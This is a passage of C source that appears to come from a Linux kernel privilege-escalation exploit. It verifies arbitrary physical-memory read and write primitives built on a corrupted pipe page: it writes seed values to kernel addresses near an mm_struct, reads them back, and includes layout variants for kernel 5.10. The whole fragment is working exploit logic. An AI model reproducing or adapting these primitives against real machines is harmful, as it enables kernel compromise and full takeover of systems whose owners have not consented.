  kernel_read_data(fd, proof_addr, physrw_after_write, sizeof(overwrite));
#endif

  /* 64-bit proof lives on the same page pipe just copied.  page+0x7100
   * sits past an mm_struct object and can miss the pipe's struct page. */
  uintptr_t proof64_addr = (proof_addr & ~(PAGE_SIZE - 1)) + 0x200;
  uint64_t seed64 = PHYS64_SEED;
  uint64_t next64 = PHYS64_NEXT;
  ssize_t seed64_wr =
      kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64));
  uint64_t seed64_cfg = 0;
  kernel_read_data(fd, proof64_addr, &seed64_cfg, sizeof(seed64_cfg));
  physrw_read64_before = pipe_read64(fd, proof64_addr);
  physrw_read64_ok = physrw_read64_before == seed64;
  pr_info("phys step read64 done ok=%d value=%016zx cfg=%016llx wr=%zd "
          "addr=%016zx page=%016zx\n",
          physrw_read64_ok, physrw_read64_before,
          (unsigned long long)seed64_cfg, seed64_wr, proof64_addr,
          direct_to_page(proof64_addr));
  physrw_write64_value = next64;
  physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
#ifdef PSELECT_WAITER_LAYOUT_5_10
  pipe_phys_read_data(
      fd, proof64_addr, &physrw_read64_after, sizeof(physrw_read64_after));
#else
  kernel_read_data(
      fd, proof64_addr, &physrw_read64_after, sizeof(physrw_read64_after));
#endif
  physrw_write64_ok =
    physrw_write64_ok && physrw_read64_after == physrw_write64_value;

  return physrw_read_ok &&
         memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
         physrw_write_ok &&
         memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
         physrw_read64_ok && physrw_write64_ok;
}
